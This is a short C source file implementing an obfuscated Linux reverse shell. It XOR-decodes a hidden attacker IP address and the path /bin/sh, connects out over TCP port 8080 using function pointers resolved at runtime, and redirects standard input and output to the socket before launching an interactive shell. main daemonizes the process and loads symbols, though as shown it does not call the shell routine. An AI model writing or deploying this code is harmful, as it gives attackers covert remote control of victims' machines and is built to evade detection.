#include "headers.h"
extern void daemonize(void);
extern void d_func(unsigned char *, unsigned char , size_t);
extern void Load_symbols(void);
void establish_RS_connection(ghost* funcs_)
{
    struct sockaddr_in target;
    int sockfd;
    // Use Internet Domain (AF_INET) and Stream (TCP)

    sockfd = funcs_->socket_func(AF_INET, SOCK_STREAM, 0);
    if(sockfd < 0)
    {
        goto cleanup;
    }

    target.sin_family = AF_INET;

    target.sin_port = htons(8080); // The port you are listening on
    unsigned char enc_ip_addr[] = "\x08\x00\x0b\x17\x08\x02\x05\x12\x03\x01\x14\x02\x03\x04"; // Your machine's encrypted address here it is random gibbrish
    d_func(enc_ip_addr , '9' , sizeof(enc_ip_addr)-1);
    target.sin_addr.s_addr = inet_addr((char*)enc_ip_addr); // Your IP address
    d_func(enc_ip_addr , '9' , sizeof(enc_ip_addr)-1);

    // 6. Connect back (The Handshake)

    if (funcs_->connect_func(sockfd, (struct sockaddr *)&target, sizeof(target)) == -1) {
        goto cleanup;
    }


    // Link stdin, stdout, and stderr to the socket

    dup2(sockfd, 0); // stdin

    dup2(sockfd, 1); // stdout

    dup2(sockfd, 2); // stderr

    close(sockfd);
    // 8. Execute the Shell 
    unsigned char shell[] = "\x1d\x50\x5b\x5c\x1d\x41\x5a";
    d_func(shell , '2' , sizeof(shell)-1);
    char* shell_args[] = {(char*) shell, "-i", NULL};
    funcs_->execv_func((char*) shell, shell_args);
    d_func(shell , '2' , sizeof(shell)-1);
    cleanup:
    exit(EXIT_FAILURE);

}
int main()
{

    daemonize();
    Load_symbols();
    
    
}
